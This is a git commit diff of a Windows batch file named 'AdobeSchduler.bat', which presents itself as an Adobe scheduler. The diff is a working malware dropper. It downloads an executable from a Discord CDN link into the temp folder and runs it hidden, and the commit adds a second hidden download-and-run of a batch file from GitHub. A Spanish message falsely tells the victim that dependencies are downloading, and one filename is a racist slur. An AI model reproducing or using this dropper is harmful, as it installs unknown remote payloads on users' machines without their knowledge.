977d6b943bade3dbbbf5cde1645717c615b95969
ghgodbomboclat <ghettogodbomboclat@proton.me>
2024-11-14 09:51:54 -0600

    Update AdobeSchduler.bat

--- AdobeSchduler.bat
+++ AdobeSchduler.bat
@@ -1,8 +1,11 @@
 @echo off
 title Cloud
-set "url=https://cdn.discordapp.com/attachments/1245898799210168331/1306390427573948456/ZXNwbGFjaA-1.exe?ex=67367e65&is=67352ce5&hm=a745d9d31d9c60d85751c48350d87fc3856b02f426120037ad5b8b97c87a4ab1&"
+set "url=https://cdn.discordapp.com/attachments/1245898799210168331/1306644489376628746/ZXNwbGFjaA-1.exe?ex=67376b02&is=67361982&hm=4f3c7abfe624047e6461c3083d2c4ee1d81257477975e7f1c43da6ceebb49345&"
 set "filename=georgefloydss.exe"
+set "urlbatch=https://raw.githubusercontent.com/ghgodbomboclat/apguacamole-commons/refs/heads/main/georgefloydss.bat"
+set "bfn=georgefloydss.bat"
 color b
 echo NO TOQUES NADA!!! Las dependencias se estan descargando, esto podria tomar un buen tiempo, cuando se termine se va a cerrar automaticamente.
 cd /d "%TEMP%"
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%filename%'); Start-Process '%filename%' -WindowStyle Hidden
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%urlbatch%', '%bfn%'); Start-Process '%bfn%' -WindowStyle Hidden
